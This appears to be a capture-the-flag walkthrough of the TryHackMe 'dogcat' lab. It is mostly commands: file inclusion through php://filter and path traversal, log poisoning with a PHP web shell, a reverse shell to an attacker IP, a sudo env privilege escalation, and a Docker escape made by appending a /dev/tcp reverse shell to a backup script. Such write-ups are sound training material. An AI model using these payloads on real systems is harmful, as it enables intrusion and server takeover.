# dogcat

**Room Link:** [https://tryhackme.com/room/dogcat](https://tryhackme.com/room/dogcat)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (393).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>



### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```



**Browser**

```
http://10.10.228.190/?view=php://filter/convert.base64-encode/resource=dog
```

**Kali**

```
echo "PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
```

<figure><img src="../../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>

**Browser**

```
http://10.10.228.190/?view=php://filter/convert.base64-encode/resource=dog/../index
```

**Kali**

```
echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4d
C9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+
CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJ
lZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0ci
kgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJle
HQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWlu
c1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICR
leHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogIC
AgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" | base64 -d
```

<figure><img src="../../.gitbook/assets/image (395).png" alt=""><figcaption></figcaption></figure>



**Browser**

```
http://10.10.228.190/?view=dog/../../../../etc/passwd&ext=
```

<figure><img src="../../.gitbook/assets/image (396).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (397).png" alt=""><figcaption></figcaption></figure>

**Burp**

```
GET /?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=ls HTTP/1.1
Host: 10.10.129.114
User-Agent: <?php system($_GET['cmd']);?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

<figure><img src="../../.gitbook/assets/image (398).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 1337
```

**Burp**

```
GET /?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=php+-r+'$sock%3dfsockopen("10.10.145.14",1337)%3bexec("sh+<%263+>%263+2>%263")%3b' HTTP/1.1
Host: 10.10.129.114
User-Agent: <?php system($_GET['cmd']);?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

<figure><img src="../../.gitbook/assets/image (399).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (400).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
script -qc /bin/bash /dev/null
ctrl + Z
stty raw -echo;fg
```

## Privilege Escalation

**Exploit:** [https://gtfobins.github.io/gtfobins/env/](https://gtfobins.github.io/gtfobins/env/)

```
sudo -l
/usr/bin/env /bin/sh -p 
```

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Break out of Docker



We get a hint we're actually in a docker container

**Victim**

```
ls -lah /
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can see there is a backups folder that tars the contents of /root/container since we have access to edit this file we modify the file with a reverse shell

**Victim**

```
cat /opt/backups/backup.sh
echo "sh -i >& /dev/tcp/10.10.113.93/1440 0>&1" >> /opt/backups/backup.sh
cat /opt/backups/backup.sh
```

**Kali**

```
nc -lvnp 1440
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





